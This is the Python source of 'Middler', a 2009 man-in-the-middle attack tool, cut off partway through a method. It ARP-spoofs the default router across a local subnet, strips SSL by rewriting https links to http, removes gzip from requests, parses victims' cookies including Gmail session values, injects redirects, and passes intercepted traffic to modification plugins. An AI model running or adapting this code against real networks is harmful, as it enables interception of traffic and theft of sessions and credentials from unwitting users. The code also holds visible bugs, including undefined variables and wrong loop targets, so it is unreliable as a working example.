#!/usr/bin/env python

# Version 20090703

#import middler
# Copyright 2009 Jay Beale
# Licensed under GPL v2

from middlerlib.JLog import *

# Start intercepting traffic.
from Middler_Firewall import startRedirection,stopRedirection

import os, signal, socket, SocketServer, select, sys, Cookie
import re, urllib
import threading, thread
from scapy import *

#### Globals

keep_gzip_in_requests = 0
port = 0

# Process ID's for any processes we fork
child_pids_to_shutdown = []
toggle_arpspoof = False

####################################################################################################
# Network interface code
####################################################################################################

def find_my_default_router_and_interface():

    # On Linux, get the router IP address out of /proc/net/route
    #
    # You just need to translate the IP address in the third (gateway) column of the line that has eight 0's
    # (00000000) in its second (destination) column.

    # Use netstat -rn to figure out what the operating system's default router is and what
    # its Internet interface is.

    (stdin,stdout) = os.popen2("netstat -rn","r",100)
    for line in stdout:
        # BSD and OS X
        if line.startswith("default"):
            fields = line.split()
            router_interface = fields[5]
            router_ip = fields[1]
            break
        elif line.startswith("0.0.0.0"):
            fields = line.split()
            router_interface = fields[7]
            router_ip = fields[1]
            break
    stdin.close()
    stdout.close()

    return (router_interface,router_ip)

####################################################################################################
# ARP spoofing code
####################################################################################################

def arpspoof(impersonated_host, victim_ip, my_mac):
  const_ARP_RESPONSE = 2

  # define a constant for ARP responses
  const_ARP_RESPONSE = const_ARP_RESPONSE

  # Build an ARP response to set up spoofing
  arp_response = ARP()
  # Set the type to a ARP response
  arp_response.op = 2
  # Hardware address we want to claim the packet
  arp_response.hwsrc = my_mac
  # IP address we want to map to that address
  arp_response.psrc = impersonated_host
  # MAC address and IP address of our victim
  arp_response.hwdst = victim_mac
  arp_response.pdst = victim_ip
  # Issue the ARP response
  send(arp_response)

def find_mac(interface):
  # Run ifconfig for the named interface.
  (outf,inf,errf)=popen2(" ".join("ifconfig ",interface))
  # Just grab the line(s) that have a MAC address on them.
  ether_lines = [ line for line in outf.readlines() if line.find("ether") >= 0 ]

  # If there are not MAC address lines, we're busted.
  if ether_lines == []:
    # Warn the user that we can't arpspoof if there are no interfaces
    debug_log( "  WARNING: cannot determine MAC address for interface %s " % interface)
    debug_log( "  ARP spoofing deactivated.")
    return("NONE")
  else:
    line = ether_lines.pop()
    return(line)

def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_host="defaultrouter"):
  """This routine sets up ARP spoofing to get traffic on the local LAN to our
  system.  It uses the arpspoof() routine above to actually construct and send
  the packets."""

  # We start by determining our own MAC address on the interface of choice and
  # figuring out what our default gateway is.

  # We may indeed be using a different interface, particularly if we're
  # ARP spoofing on one interface and sending traffic out via a separate
  # network connection.  Imagine a dual-homed host that isn't the normal
  # router.  It could indeed start being the router!

  # We need to know the router ip, so we know who to impersonate.

  (router_interface,router_ip) = find_my_default_router_and_interface()

  # If the user doesn't request a specific interface, we use their default
  # interface.  If he doesn't request a specific target, we use his default
  # router.

  if (interface == "defaultroute"):
    interface = router_interface
  if (impersonated_host == "defaultrouter"):
    impersonated_host = router_ip

  # Now, let's set up to send ARP replies either to a specifically-named target
  # or to everyone on the network except the default router.

  my_mac = find_mac(interface)
  if my_mac == "NONE":
    exit(1)

  # TODO-Med: Allow the user to submit a list of interfaces.
  # TODO-High: Make this work on Windows.

  # We'll fork this part off, so it can run for a long time without slowing
  # everything else down.

  pid = os.fork()

  # For the parent...
  if pid:
    # Make sure we don't exit until this child exits
    os.waitpid(pid,0)
    child_pids_to_shutdown.append(pid)
  # For the child...
  else:
    # Spoof away, Mr McManis


    if target_host != "ALL":
      while 1:
        arpspoof(impersonated_host,target_host,my_mac )

    # Eventually, let's use an nmap ARP or "list" scan to enumerate all IPs in
    # the subnet.  For now, we'll assume a class C.
    # As an intermediate move, we could look at the netmask.  On Linux, we can read
    # this from /proc/net/route's 8th column, though the netmask is in hexadecimal.

    # elif (os.path.exists(r'/usr/bin/nmap') or os.path.exists(r'/usr/local/bin/nmap')):
    else:
      while 1:
        final_period_location = router_ip.rfind(".")
        router_network = router_ip[:final_period_location]
        final_period_location += 1
        router_hostnum = router_ip[final_period_location:]
        for host in xrange(1,255):
          if host != router_hostnum:
            targetip = ".".join(router_network,host)
            arpspoof(impersonated_host,target_host,my_mac)


#
# string &remove_ssl(text) takes a string and changes all of the https links into http links
#
def remove_ssl(text):
  """ remove_ssl(text) takes a chunk of text and changes all of the https links
  into http links, adding a pattern (currently /secure3 so as to place state
  in the link itself.

  We use this to allow Middler to identify requests that it should issue with
  SSL, while keeping the client side of the connection in straight HTTP.
  """

  # We want to change links that looks like this:
  #
  # https://host/foo
  #
  # to ones like this:
  #
  # http://host/secure3/foo
  #
  # We will then change any links they click on back to the original form
  # so that we talk to the servers through an encrypted connection and thus
  # have access to the pages we're loading.

  removessl_pat=re.compile(r"https://([^\\]+)(/.*)")
  newtext = removessl_pat.sub(r"http://\1/secure3\2",text)
  return newtext

#def parse_useragent(useragent):
    #pass        # DO SOMETHING HERE!?
    #return useragent


#
# Define both substring matches and regular expressions to match client
# request request_headers against.
#
prefix = {}
len_prefix = {}
prefix["host"] = "Host"
prefix["authorization"] = "Authorization"
prefix["useragent"] = "User-Agent"
prefix["cookie"] = "Cookie"
prefix["connection"] = "Connection"
prefix["proxyconnection"] = "Proxy-Connection"
prefix["acceptencoding"] = "Accept-Encoding"


# Pre-compute the lengths of the prefix (substring matches) to speed parsing.
# While we're at it, let's create a tuple of the keys here so we can
# change the line matching routine later to loop over the available
# prefixes more quickly.

client_header_prefixes = tuple(prefix.keys())

for item in client_header_prefixes:
    len_prefix[item] = len(prefix[item])

# Pre-compile regular expressions for client request_headers.
method_pat=re.compile(r"^(GET|POST|CONNECT) (.*) (HTTP\/\d.\d)")
blankline_pat=re.compile(r"^\s*\n\s*$")

# Special case - this is for putting back https on links
putbackssl_pat=re.compile(r"^/secure3(/.*)")

# Set up the patterns
statuscode_pat=re.compile(r"^HTTP\/\d\.\d (\d\d\d) (.*)")
contentlen_pat=re.compile(r"^Content-Length: (\d*)")
contenttype_pat=re.compile(r"^Content-Type: (.*)")
contentencoding_pat=re.compile(r"^Content-Encoding: (.*)")
setcookie_pat=re.compile(r"^Set-Cookie2?: (.*)")
location_pat=re.compile(r"^Location: (.*)")
connection_pat=re.compile(r"^Connection: (.*)")
out_of_header_pat=re.compile(r"^\n?")

#
# The Session class is for storing information about a given
# person/process that we learn while proxying one connection
# so as to use that information while handling other connections.
#
# Among other things, this is where we keep note of someone's username
# in an application.  When we get the GUI going, this is where we'll
# track what actions we've cued for their user on their next session.
#

class Sessions(dict):
    def getSession(self, source_ip):
        session = self.get(source_ip, None)
        if session == None:
            session = { 'source_ip' : source_ip }
            self[source_ip] = session
        return session

# Check sys.modules['middler']'s directory for a plugins/ directory.

PLUGINS = []
if (not PLUGINS or len(PLUGINS) == 0):

    ###### This code loads the fileparsers into the PLUGINS list
    parserdir = "%s%splugins"%(os.sep.join(sys.modules['middlerlib'].__file__.split(os.sep)[:-1]), os.sep)
#    parserdir = "%s%splugins"%(os.sep.join(sys.modules['middlerlib'].__file__.split(os.sep)[:-1]), os.sep) + "/enabled"
    debug_log(">>plugindir: %s<<"%parserdir)

    filename = None
    for filename in  os.listdir(parserdir):
        try:
	    # Add any file in the active plugins directory that ends in .py and doesn't
	    # start with _ to our list of plugins.

            if (len(filename) > 3 and filename[0] != "_" and filename[-3:] == ".py"):
#		debug_log(">>Trying to load plugin from middlerlib.plugins.enabled.%s"%filename[:-3] )
                PLUGINS.append(__import__("middlerlib.plugins.%s"%filename[:-3], None, None, "middlerlib.plugins"))
        except:
            debug_log("Error loading plugin %s"%filename)
            x,y,z = sys.exc_info()
            sys.excepthook(x,y,z)
            pass

# If we haven't found the plugins/ directory yet, check the current directory
# for a plugins/ directory.

if (not PLUGINS or len(PLUGINS) == 0):

    ###### This code loads the fileparsers into the PLUGINS list
    #debug_log( os.path.abspath(os.curdir)
    parserdir = "./plugins"
    debug_log(">> Had to set plugin directory relative to current dir - plugindir: %s<<"%parserdir)
    filename = None
    try:
      for filename in  os.listdir(parserdir):
          try:
              if (len(filename) > 3 and filename[0] != "_" and filename[-3:] == ".py"):
                  PLUGINS.append(__import__("middlerlib.plugins.%s"%filename[:-3], None, None, "middlerlib.plugins"))
          except:
              debug_log("Error loading plugin %s"%filename)
              x,y,z = sys.exc_info()
              sys.excepthook(x,y,z)
              pass
    except OSError:
      pass

###########################################################
# Networking code starts here.                            #
###########################################################

#
# Tell SocketServer.ThreadingTCPServer to release the ports
# it binds to more quickly upon exit.
#

class PluginSaysDontSend(Exception):
  def __init__(self, headers, data):
    self.headers = headers
    self.data = headers

#class MiddlerThreadTCPServer(SocketServer.ThreadingTCPServer):
class MiddlerThreadTCPServer(SocketServer.TCPServer):
  allow_reuse_address = True


#
# Set up the HTTP proxy - we'll have more protocols soon.
#

class MiddlerHTTPProxy(SocketServer.StreamRequestHandler):

  # Set up a sessions() data structure for tracking information about
  # each target user, indexed by IP address.

  sessions = Sessions()

  def __init__(self, request, client_address, server):
    self.client_headers = {}
    self.current_user = MiddlerHTTPProxy.sessions.getSession(client_address)
    self.remove_ssl_from_response = 0
    #debug_log( (request, client_address, server, dir(self))
    SocketServer.StreamRequestHandler.__init__(self, request, client_address, server)

  ####################################################################################################
  # Request Parsing code - moving this out of Core code - plugins do this                            #
  ####################################################################################################

  # parse_any_post_params() - Parse the data in a POST request.
  def parse_any_post_params():
    """Parse the data in a POST request."""

    # Now let's parse the rest of the request if any exists.

    while line == "":
      line = self.rfile.readline()
      #debug_log(line)

      #debug_log(line,0)
      if client_headers["method"] == "POST":
        #developer_log("We have a post - TODO: parse the params!\n")
        if re.match("&",line):
          params = line.split("&")
          for param in params:
            if re.match("=",param):
              (variable,value) = param.split("=")
              #developer_log("POST data: %s=%s" % (variable,value))
            else:
              developer_log("POST data: %s" % param)
        else:
          developer_log("POST data: %s" % line)

      modified_request = modified_request + line
    # end while line == "":


  def parse_useragent(self, user_agent):
    current_user = {}
    client_headers = {}

    if not current_user.has_key("UserAgent"):

      client_headers["user_agent"]=user_agent
      current_user["UserAgent"]=user_agent
      # Now parse out the specific browser
      firefox_pat=re.compile(r".*Firefox/(\d+\.\d+\.\d+).*")
      iphone_safari_pat=re.compile(r"Mozilla/(\d+\.\d+) \(iPhone; U; CPU iPhone OS (\d+_\d+) like Mac OS X\;\s*\w+-\w+.*\) AppleWebKit/([\d\.]+)  \(KHTML, like Gecko\) Version/([\d\.]+) Mobile/(\w+) Safari/([\d\.]+)")

      # TODO: grab browser user agent strings from InGuardians.com web server...

      if firefox_pat.match(user_agent):
        # Example of catching Firefox in use:
        # Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
        browser_type="Firefox"
        browser_version_set=firefox_pat.match(user_agent).groups()
        browser_version=browser_version_set[0]
        current_user["browser_type"] = browser_type
        current_user["browser_version"] = browser_version
       # print "Found that user has Firefox version",browser_version,"\n"
      elif iphone_safari_pat.match(user_agent):
        # Example of catching iPhone in use:
        #
        # User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X;
        # en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1
        # Mobile/5A347 Safari/525.20
        browser_type="iPhone Safari"
        browser_version_set=iphone_safari_pat.match(user_agent).groups()
        browser_version=browser_version_set[4]
        current_user["browser_type"] = browser_type
        current_user["browser_version"] = browser_version
        # TODO: Figure out which version changes the most or is used in OSVDB for tracking
        #print "Found that user has iPhone Safari version",browser_version,"\n"
      #elif apple_pub_sub.match(useragent):
      #  User-Agent: Apple-PubSub/65.1.1

      # User-Agent: KNewsTicker v0.2
      # User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-us) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20

      #else:
        #developer_log ("UserAgent string we cannot yet parse:" + user_agent,"\n")
    return current_user



  # parse_cookies(raw_cookie_line) - Parse any Cookie: lines in the request.
  def parse_cookies(self, raw_cookie_line):
    """Parse any Cookie: lines in the request."""

    # Parsing a string like this:
    #
    # #      Cookie: GMAIL_AT=xn3j31q5q8ylqcg13fyw9gchigyi6d; gmailchat=jay.beale@gmail.com/804066; S=payments=WTqZcq5
    #L9bU:static_files=HxA60P1YyYE:gmail=-zkMnu97hlGeg7NNu7tXGQ:gmail_yj=Qr78OzTSgECwGI1QDvbIfQ:gmproxy=WPfKvb
    #C3a4Q:gmproxy_yj=Ar5Trs-pYMw:gmproxy_yj_sub=KcLOAEX1F4g;
    cookie={}
    raw_cookies=raw_cookie_line.split(r"; ")
    for raw_cookie in raw_cookies:
      # We want the opposite of this:   urllib.urlencode()
      unescaped_cookie=urllib.unquote(raw_cookie)
      #debug_log("Found client trying to send cookie: " + raw_cookie + " decoded version : " + unescaped_cookie)
      #developer_log("Found client trying to send cookie: " + raw_cookie + " decoded version : " + unescaped_cookie)

      equal_pos=unescaped_cookie.index('=')
      # Separate unescaped_cookie into two pieces name= and value
      cookie_name=unescaped_cookie[0:equal_pos]
      cookie_value= unescaped_cookie[equal_pos+1:]
      # BUG/TODO: the previous line might need -1 added to end.
      #developer_log("Found cookie name was " + cookie_name)
      #developer_log("Found cookie value was " + cookie_value)

      # Now remove the equal from name=
      #cookie_name.slice!(-1,1)
      cookie[cookie_name]=cookie_value

      # Let's display this cookie.  But first, let's go a step further if the cookie value contains = signs.
      #
      # Looking to parse a cookie that looks like this:
      #
      # ID=949e33deacfe6ad9:FF=4:LR=lang_en:LD=en:NR=10:TM=1175614973:LM=1210206169:FV=2:GM=1:IG=3:GC=1:S=0uWPvrTxO6BrbAUR;

      has_embedded_cookies_pat = re.compile(r"^([^=]+)=([^:=]+):")
      if has_embedded_cookies_pat.match(cookie_value):
        #developer_log("Found that cookie " + cookie_name + " has embedded cookies inside.")
        # Let's split this intro strings like this:
        #
        # ID=949e33deacfe6ad9:
        # FF=4

        embedded_cookies = cookie_value.split(":")
        for embedded_cookie in embedded_cookies:
          (name,value) = embedded_cookie.split("=")
          #developer_log("Embedded cookie name " + name + " has value " + value)

        #items = embedded_cookies.match(cookie_value).groups()
        #developer_log("Embedded cookie 1: " + items[0] + " = " + items[1] + "\n")

      else:
        pass
        #developer_log("Cookie " + cookie_name + " had value " + cookie_value)

      # check this for Google ID
      # Parse a line like this:
      # gmailchat=jay.beale@gmail.com/839199;

      if cookie_name == "gmailchat":
        developerlog("Current session is user %s\n" % cookie_value)


  ####################################################################################################
  # Plugin Architecture functions are found here - very important to understand                      #
  ####################################################################################################

  # This function runs through all plugins that have subscribed, passing each
  # the request headers and data, receiving both back, possibly modified along
  # with notification as to whether the plugin changed anything and if the
  # plugin requires that no other plugin receive a chance to make changes
  # before we hand the data back to the user.

  def doRequest(self, session, request_headers, data):
    global PLUGINS
    for plugin in PLUGINS:
      try:
        developer_log("executing plugin %s" % plugin)
        request_headers, data, changed, stop = plugin.doRequest(session, request_headers, data)
        if stop:
          break
      except PluginSaysDontSend, e:
        raise e
      except Exception, msg:
        print "ERROR in plugin %s: %s"%(repr(plugin), repr(msg))
    return (session, request_headers, data)

  # This function runs through all plugins that have subscribed, passing each
  # the response headers and data, receiving both back, possibly modified along
  # with notification as to whether the plugin changed anything and if the
  # plugin requires that no other plugin receive a chance to make changes
  # before we hand the data back to the user.  This function also gives each
  # plugin a copy of the request headers, allowing the plugins to know what
  # contributed to this response.  In particular, the request's method/URL are
  # likely very critical here.

  # TODO-Med: Figure out if we should be handing the request data (like POST
  # data) to the plugins.

  def doResponse(self, session, request_headers, response_headers, data):
    global PLUGINS
    for plugin in PLUGINS:
      try:
        response_headers, data, changed, stop = plugin.doResponse(session, request_headers, response_headers, data)
        if stop:
          break
      except PluginSaysDontSend, e:
        raise e
      except Exception, msg:
        print "ERROR in plugin %s: %s"%(repr(plugin), repr(msg))
    developer_log("returning from doResponse")
    return (session, response_headers, data)


  ####################################################################################################
  # Main handler functions
  ####################################################################################################

  # handle() - handles one client connection intended for a web server.
  def handle(self):
    """Handles one client connection intended for a web server."""

    # close_request: tracks whether the browser has asked to close the
    # connection when we're done servicing this request.
    #print self
    close_requested=0

    while close_requested == 0:
      debug_log("Started a new thread to handle connection from %s!" % self.client_address[0])

      #test_header = "HTTP/1.1 200 OK" + "Date: Sat, 09 Aug 2008 09:44:35 GMT" + "Server: Apache/1.3.41 (Unix) mod_perl/1.31-rc4" + "Connection: close" + "Content-Type: text/html; charset=iso-8859-1" + "\n\nfoo\n"

      desthostname = "" # var: desthostname stores the server name we're trying to contact.
      modified_request = "" # var: modified_request stores the modified request, which is the same as the real request except when we make a change.
      ## var: client_headers{} stores relevant header values, to take effort off plug-in authors.
      #client_headers =  {}

      #
      # Store variables about things we want to modify:
      #


      inject_status_code = 0  # var: inject_status_code - should we inject a new status code on next request?

      # Status code message we'd like to inject, like:
      #
      # HTTP/1.1 307 Temporary Redirect
      # ...
      # with location field:
      #
      # Location: http://mail.google.com/mail/

      status_code_to_inject = ""

      # Location we'd like to inject, with 301 (permanent) or 307 (temporary)
      #location_to_inject = ""


      # Content-Length handling - if we modify POST data, we need to recalculate the content length.
      # var: recalculate_content_length - Track whether we need to recalculate the content length.
      # TODO: Should we track the current content_length offset with each change?
      recalculate_content_length = 0
      suppress_content_length = 1


      # var: need_to_do_this_over_ssl keeps track of whether we're proxying a
      # request to a link that we previously converted from https:// to http://.
      need_to_do_this_over_ssl=0

      ###########################################################################
      # Parse HTTP request headers
      ###########################################################################

      # Start by parsing the client headers until we hit a blank line signaling
      # that those headers are over.

      # TODO-Low: move the header line-specific code here into anonymous
      #           routines, referenced by a hash like the prefix{} and
      #           len_prefix{} hashes.

      # TODO-Med: remove the repeated modified_request concat lines, replacing
      #           with logic that simply does this unless the routine would
      #           not have.  If it would not have, let's have it just blank the
      #           line.

      #print("self.rfile is the following kind of object %s\n" % str(type(self.rfile)) ) 
      try:
	line = self.rfile.readline()
        #sys.stdout.write(line)
        #sys.stdout.write(r"\r\n")
      except:
	print "ERROR: first readline() on the request failed!\n"
	
      request_headers = [ ("Request",line) ]

      try:
        while True:
          line = self.rfile.readline()
          if line in ("\r\n" ,"\n"):
            break
          header, value = line.split(": ",1)
          request_headers.append((header,value))
        #sys.stdout.write(line)
      #print "done reading request_headers!"
      except:
	debug_log("Probably just finished reading request header")

      #### Handle Header-analysis
      method, part2 = request_headers[0][1].split(' ',1)
      url, HTTPprotocol = part2.rsplit(' ',1)
      if method == "CONNECT":
        #debug_log("Found a CONNECT method.  Changing to GET.\n")
        method = "GET"
        # TODO-Low: Parse CONNECT methods better so we allow people to use
        # this as a positive proxy.

      if self.remove_ssl_from_response == 1:
        # Check to see if we need to put the SSL back!
        if putbackssl_pat.match(url):
          # Make sure we do an SSL connection when we connect to the server
          need_to_do_this_over_ssl=1
          # Now change the URL back, removing /secure3
          url=putbackssl_pat.match(url).groups()[0]
          # We put the changed URL in the request we'll send to the server
          header[0] = " ".join((method, url, HTTPprotocol)) + "\n"

      # Now for the rest of the request_headers (the official ones)
      length = len(request_headers)
      index = 1
      while index < length:
        #print index
        #print request_headers[index]
        header, value = request_headers[index]
        if header == prefix["host"]:
          desthostname = value.strip()
          #modified_request = modified_request + line

        ### TODO-Med: put this in a module!
        ##elif header == prefix["authorization"]:
          ##username, password = decode64(line[len_prefix["authorization"]:])
          ##client_headers["auth_basic_username"] = username
          ##client_headers["auth_basic_password"] = password
          ###modified_request = modified_request + line

        #elif method_pat.match(line):
          #(method,url,HTTPprotocol) = method_pat.match(line).groups()
          #if re.compile(r"^CONNECT").match(method):
            #debug_log("Found a CONNECT method.  Changing to GET.\n")
            #method = "GET"
            #re.sub(r"^CONNECT","GET",line)

          # Store the URL, method and HTTPprotocol in their possibly-modified form
          #self.client_request_url = url
          #self.client_headers["request_method"]=method
          #self.client_headers["request_version"]=version

        #elif header == prefix["useragent"]:
          ## Unless we already have this user's UserAgent string, let's log and parse it.
          #if not "User Agent" in self.current_user:
            #useragent = value

            #self.client_headers["user_agent"]=useragent
            ## TODO: add a set of return values that tell us what browser/useragent we have, what version, what operating system, os version, and hardware architecturee
            #self.parse_useragent(useragent)
          #modified_request = modified_request + line

        #elif header == prefix["cookie"]:
            #c = Cookie.SimpleCookie()
            #cookies=line[len_prefix["cookie"]:]
            #c.load(cookies)
            #client_headers['cookies'] = c
            ##client_headers["cookies"] = self.parse_cookies(cookies)
            ## Unless we want to tamper with or remove cookies, just do this:
            ##modified_request = modified_request + line
        elif header == prefix["connection"]:
            connection = value
            self.client_headers["connection"] = connection
            if connection == "Close":
              close_requested = 1
              #debug_log("Encountered a Connection: close from browser - it doesn't want keepalive.")

        elif header == prefix["proxyconnection"]:
          proxyconnection = value

          self.client_headers["proxyconnection"] = proxyconnection
          if proxyconnection.strip().lower() != "keep-alive":
            #debug_log("Encountered a Proxy-Connection: from browser - should we take the client through that proxy?\n")
            #debug_log("Proxy-Connection value was %s.\n" % proxyconnection)
            developer_log("Debug: stripping out a Proxy-Connection - are you sure you're not pointing your browser at this intentionally?")

            # Strip this line out so we don't tell the server we're using a proxy.
            #
            # So the following line is commented out.
            # modified_request = modified_request + line

        elif header == prefix["acceptencoding"]:
          acceptencoding = value
          #self.client_headers["acceptencoding"] = acceptencoding
          # TODO: Make this a user option

          # Remove any acceptance of gzip encoding.
          if not keep_gzip_in_requests:
            request_headers.pop(index)
            length -= 1
          #modified_request = modified_request + line
        #elif blankline_pat.match(line):
          ## Stop processing if we hit the blank space at the end of the request_headers.
          ##modified_request = modified_request + line
          #break
        ##else:
          ## If we haven't matched any of these patterns, but we're still in the
          ## request headers, just add this line to the replacement request.
          ##modified_request = modified_request + line
        index += 1

      debug_log("%s is requesting %s:%s" % (self.client_address[0], desthostname, port))

      try:
	if method == "POST":
	  request_data = self.rfile.readline()
	  #developer_log("done reading POST data: \n%s"%request_data)
	else:
	  request_data = ""
	  #developer_log("done reading data! ")
      finally:
        self.rfile.close()
	
      self.current_user, request_headers, request_data = self.doRequest(self.current_user, request_headers, request_data)
      developer_log("returned from doRequest")

      ###########################################################################
      # Send request and parse HTTP response headers
      ###########################################################################

      #response_to_send_to_client=""
      #server_headers = {}
      response=""

      # Open a connection to the desired server and send request


      # If we need to do this over ssl, use the urlopen library.
      if need_to_do_this_over_ssl:
        debug_log("Connecting HTTPS to %s\n" % desthostname)
        # Construct an https URL.
        newurl = "".join(("https://", desthostname, "/", url))
        #developer_log("constructed URL %s\n" % newurl)
        server = urllib.urlopen(newurl)
        response = server.read()
        server.close()
      # ...otherwise, use the straight socket library
      else:
        debug_log("Connecting HTTP to: %s:%d\n" % (desthostname,port))
        modified_headers = []
        for header in request_headers[1:]:
          modified_headers.append("%s: %s"%(header))
        modified_request = "".join([ request_headers[0][1], "".join(modified_headers), "\n", request_data, "\n"])

	# Create a socket for talking to the web server.
	server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.settimeout(5)
        server_tuple = (desthostname,port)
        debug_log("About to connect to: %s:%d\n" % (desthostname, port))

        try:
	  # Attempt to connect and send the request
          server.connect(server_tuple)
          #print modified_request
          server.send(modified_request+"\n")
        except:
	  #print "Closing - failed to connect and send?\n"
	  #sys.stdout.flush()
	  server.close()
          debug_log("Connection failed to host %s\n" % desthostname)
          break
        #debug_log("Just sent modified request: \n%s" % modified_request)
        #developer_log("Just sent modified request:\n%s" % modified_request)

        # Now get data from the server
	try:
          input = server.recv(1024)
          #print "read %d bytes from socket"%len(input)
	  
	  while input != '':
            response = response + input
            input = server.recv(1024)
            #print "read %d bytes from socket"%len(input)
	    #debug_log("Added more to response: %s" % input)
	except socket.error:
	  server.close()
	  #debug_log("socket error - setting close requested.\n")
	  close_requested=1
	  developer_log("closing server connection inside the socket.error exception catch.\n")
	  break
	except:
	  developer_log("server read loop triggered non-socket.error exception")
	  server.close()
	  
	server.close()

      # Parse the response
      modified_response=""


      # Now parse one line at a time
      content_type_is_image = 0

      firstret = response.find('\n')
      if response[firstret-1] == '\r':
        rets = "\r\n"
        diff = 4
      else:
        rets = "\n"
        diff = 2
      cutoff = response.find(rets*2)

      debug_log("\nResponse HTTP handling:  cutoff is set to %d\n" % cutoff)

      #print repr(response[:cutoff])

      if cutoff == -1:
        #print cutoff
        print "Error reading from server...  No separator found between headers and body of response"

      # pick off the data variable, since we're about to loop through response_headers
      debug_log("\nResponse HTTP pre-cutoff string is %s\n\n" % response[:cutoff+diff])
      response_data = response[cutoff+diff:]

      # You know code will be tough to debug when variables are called foo_temp1 and foo_temp.
      response_header_temp1 = response[:cutoff]
      debug_log("\nResponse_header_temp1 is %s\n" % response_header_temp1)
      response_header_temp  = response_header_temp1.split(rets)

      if IR.inject_redirect(desthostname) == 1:
        response_headers = [ ( "Response", "HTTP/1.1 307 Temporary Redirect\n" + "Location: " + location_to_inject + "\n" ) ]
      elif inject_status_code == 1:
        response_headers = [ ( "Response", status_code_to_inject ) ]
      else:
        response_headers = [ ( "Response", response_header_temp[0]) ]

      response_line_debug = str(response_headers[0])

      response_code, response_message = response_header_temp[0].split(" ",1)    # do we want the "real" one?
      # now to parse the rest of the headers
      for header_idx in xrange(1, len(response_header_temp)):
        try:
          hdr = response_header_temp[header_idx]
          header, value = hdr.split(": ",1)

        #for line in response.split("\n"):
          #line = "".join((line,"\n"))

          # Kludge/TODO : if we have an image, just keep copying!
          #if content_type_is_image == 1:
            #modified_response = modified_response + line

          #if statuscode_pat.match(line):
            #statuscode_items=statuscode_pat.match(line).groups()
            #server_headers["response_code"]=statuscode_items[0]
            #server_headers["response_message"]=statuscode_items[1]
            #if IR.inject_redirect(desthostname) == 1:

              ### TODO: Make sure we don't redict if this is the response to a link that was already redirected.

              #modified_response = modified_response + "HTTP/1.1 307 Temporary Redirect\n" + "Location: " + location_to_inject + "\n"
      #elif inject_status_code == 1:
              #modified_response = modified_response + status_code_to_inject
            #else:
              #modified_response = modified_response + line

          #elif contentlen_pat.match(line):
            #server_headers["content_length"]=contentlen_pat.match(line).groups()[0]
            #if recalculate_content_length == 0:
              ## TODO: Decide whether to recalculate Content-Length or to just skip sending it.
              #if not suppress_content_length:
                #modified_response = modified_response + line
          #elif contenttype_pat.match(line):
            #server_headers["content_type"]=contenttype_pat.match(line).groups()[0]
            #modified_response = modified_response + line
            #if re.compile(r"image/").match(server_headers["content_type"]):
              ## We have an image - just let this process straight, without logging or further parsing?
              #content_type_is_image = 1
          #elif contentencoding_pat.match(line):
            #server_headers["content_encoding"]=contentencoding_pat.match(line).groups()[0]
            #modified_response = modified_response + line
          if header.lower() == "connection":
            #server_connection_val = connection_pat.match(line).groups()[0]
            #if server_connection_val.strip().lower() == "close":
              request_close =1
              #debug_log("Server requested connection close.\n")
            #else:
              #developer_log("Server gave Connection string besides Close - we should parse this - value was %s.\n" % server_connection_val)

          #elif setcookie_pat.match(line):
            #received_cookies = setcookie_pat.match(line).groups()[0]
            ## TODO - process and change cookies.
            #modified_response = modified_response + line
          #elif location_pat.match(line):
            ## Parse the original Location line
            #location_redirect = location_pat.match(line).groups()[0]
            #debug_log("Got a redirect to location %s\n" % location_redirect)
            # If we've been told to inject a redirect...
          if IR.inject_redirect(desthostname) == 1:
              # Do not add a location line at all - we did this when we changed the status code.
              location_redirect = location_to_inject
              #debug_log("Attempting location injection in place of original redirect\n")
          # Otherwise, we can use the original one, but we might need to remove SSL from it first.
          elif self.remove_ssl_from_response == 1:
              location_redirect = remove_ssl(location_redirect)
              value = "Location: " + location_redirect + "\n"
          # Otherwise, leave the Location line untouched.
          #else:
              #modified_response = modified_response + line
            # No matter what, record the location server header.
            #server_headers["location"]=location_redirect
          #elif out_of_header_pat.match(line):
            # TODO We're out of the header now - maybe we could break this and just ferryt he rest of the bytes.
            # introduce_an_error_as_a_bookmark
            # TODO: Refactor the server connection as a socket or urlopen object, then use a while
            # loop on readline, such that we can then do a final readlines(50000) or read(50000) loop here.
            #modified_response = modified_response + line
          # Done with special header parsing.
          # Finally, if this line wasn't one of those special ones, just add it back onto the response, possibly changing it in accordance with any other patterns.
          #else:
              #modified_response = modified_response + line
          response_headers.append((header,value))
        except:
          print "Error parsing last response_header"
      # We should consider pulling one line at a time from the socket or something like using xreadlines or something like that...

      debug_log("\nbefore plugin, response headers are %s\n\n" % response_headers)
      self.current_user, response_headers, response_data = self.doResponse(self.current_user, request_headers, response_headers, response_data)
      debug_log("after plugins, response headers are %s\n\n" % response_headers )

      #  GREAT! Now let's build our reply.  TODO-med: Make SSL changes happen prior to this.
      # Caught the bug!!!!
      #
      # modified_response_temp was built without adding the rets to the first line!!!!

      response_code_line = ( "%s%s" % (response_headers[0][1] , rets) )
      modified_response_temp = [ response_code_line ]

      for header_idx in xrange(1,len(response_headers)):
        modified_response_temp.append("%s: %s%s"% (response_headers[header_idx][0],response_headers[header_idx][1],rets))
      modified_response_temp.append(rets)   #rets is the *identified* bytes used as CRLF
      modified_response_temp.append(response_data)
      modified_response = "".join(modified_response_temp)

      # If we're removing ssl, do this to the entire modified_response at once, so
      # we catch links that span multiple lines or where there are more than one
      # per line
      # TODO - put this back

      if self.remove_ssl_from_response == 1:
        modified_response = remove_ssl(modified_response)
        # TODO: Log the URL and source IP that we're changing to non-SSL so we can
        # keep track of this without the stupid kludge

      # Send the response back to the client
      #developer_log("Preparing to send modified response to client: %s" % modified_response)
      try:
	self.wfile.write(modified_response)
	self.wfile.flush()
      
	##### TODO-high: This is experimental... remove if it breaks stuff.
	close_requested = 1
	self.wfile.close()
      except:
	self.wfile.close()
      #self.wfile.close()
      #self.rfile.close()

    # while loop ends here - this happens whenever a client

    # What happens to performance if we don't close out our connections with the clients and servers?
    #
    #server.close()
    #self.wfile.close()
    #self.rfile.close()

  # Complete the connection.
  def finish(self):
    # Just in case we forgot to close off the sockets?
    # Let's see if we get errors.
